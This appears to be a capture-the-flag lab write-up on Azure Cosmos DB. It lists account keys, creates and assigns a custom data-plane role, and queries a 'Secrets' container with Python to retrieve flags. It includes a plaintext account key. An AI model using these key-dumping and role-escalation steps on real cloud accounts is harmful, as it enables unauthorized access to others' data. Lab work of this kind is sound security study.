# Cosmos DB

## Cosmos DB Keys

```sh
az cosmosdb list
az cosmosdb sql container list --account-name cosmoslab1-d090e49d --database-name test -g cosmos-labs-rg-1
az cosmosdb sql container list --account-name cosmoslab1-d090e49d --database-name FlagDatabaseLab1 -g cosmos-labs-rg-1

az cosmosdb keys list --name cosmoslab1-d090e49d --resource-group cosmos-labs-rg-1
```

Then using python script:

```py
from azure.cosmos import CosmosClient, PartitionKey

# Connection details
endpoint = "https://cosmoslab1-d090e49d.documents.azure.com:443/"
key = "EJjA8HFxIq1BJdd3bhSaxIhjAHOdrwgZqn51oB3I9WwDHWbbHfdlURMOZ6bDUza2GQT72EJ66sNbACDbyU8aPg=="

# Initialize Cosmos Client
client = CosmosClient(endpoint, key)

# Access existing database and container
database_name = 'FlagDatabaseLab1'
container_name = 'Secrets'
database = client.get_database_client(database_name)
container = database.get_container_client(container_name)

# Query all documents
query = "SELECT * FROM c"
all_items = list(container.query_items(
    query=query,
    enable_cross_partition_query=True
))

# Print all queried items
print("All items in the container:")
for item in all_items:
    print(item)
```

## Role Defini­tions & Assigm­ents

```sh
az cosmosdb list
az cosmosdb sql database list --account-name cosmoslab2d090e49d710b -g cosmos-labs-rg-1
az cosmosdb sql container list --account-name cosmoslab2d090e49d710b --database-name FlagDatabaseLab2 -g cosmos-labs-rg-2


az cosmosdb sql role definition create \
    --account-name cosmoslab2d090e49d710b \
    --resource-group cosmos-labs-rg-2 \
    --body '{
      "Id": "cd9959a7-8b38-4902-897b-267815e9f123", # For example cd9959a7-8b38-4902-897b-267815e9f123
      "RoleName": "CustomCosmosDB",
      "Type": "CustomRole",
      "AssignableScopes": [
        "/subscriptions/<subscription_id>/resourceGroups/sqldatabase/providers/Microsoft.DocumentDB/databaseAccounts/<account_name>"
      ],
      "Permissions": [
        {
          "DataActions": [
            "Microsoft.DocumentDB/databaseAccounts/readMetadata",
            "Microsoft.DocumentDB/databaseAccounts/sqlDatabases/containers/items/read",
            "Microsoft.DocumentDB/databaseAccounts/sqlDatabases/containers/*"
          ]
        }
      ]
    }'

az cosmosdb sql role assignment create \
    --account-name cosmoslab2d090e49d710b \
    --resource-group cosmos-labs-rg-2 \
    --role-definition-id cd9959a7-8b38-4902-897b-267815e9f123 \
    --principal-id 7d9e6fe9-c894-4952-9bb9-b84b19062068 \
    --scope "/"

python3 -m pip install azure-cosmos
python3 -m pip install azure-identity
```

Then using python script:

```py
from azure.identity import DefaultAzureCredential
from azure.cosmos import CosmosClient

# Use Azure AD for authentication
credential = DefaultAzureCredential()
endpoint = "https://cosmoslab2d090e49d710b.documents.azure.com:443/"
client = CosmosClient(endpoint, credential)

# Access database and container
database_name = "FlagDatabaseLab2"
container_name = "Secrets"
database = client.get_database_client(database_name)
container = database.get_container_client(container_name)

# Query all documents
query = "SELECT * FROM c"
all_items = list(container.query_items(
    query=query,
    enable_cross_partition_query=True
))

# Print all queried items
print("All items in the container:")
for item in all_items:
    print(item)
```

Flag can then be retrieved
